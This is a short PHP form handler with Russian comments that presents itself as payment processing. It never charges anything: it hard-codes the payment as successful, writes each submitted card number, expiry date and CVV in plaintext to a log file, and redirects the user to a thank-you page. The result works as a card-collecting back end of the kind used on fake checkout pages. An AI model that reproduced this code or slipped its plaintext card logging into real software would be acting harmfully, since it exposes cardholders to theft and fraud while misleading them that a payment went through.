<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cardNumber = $_POST['card_number'];
    $expiryDate = $_POST['expiry_date'];
    $cvv = $_POST['cvv'];
    $amount = $_POST['amount'];



    $paymentSuccess = true;

    if ($paymentSuccess) {
        $paymentData = [
            'card_number' => $cardNumber,
            'expiry_date' => $expiryDate,
            'cvv' => $cvv,
            'amount' => $amount,
            'status' => 'success',
            'timestamp' => date('Y-m-d H:i:s')
        ];

        file_put_contents('payments.log', json_encode($paymentData) . PHP_EOL, FILE_APPEND);

        // Перенаправляем на страницу благодарности
        header('Location: thanks.html');
        exit(); // Завершаем выполнение скрипта после перенаправления
    } else {
        echo "Ошибка: Платеж не прошел. Пожалуйста, попробуйте еще раз.";
    }
} else {
    die("Ошибка: Неверный метод запроса.");
}
?>
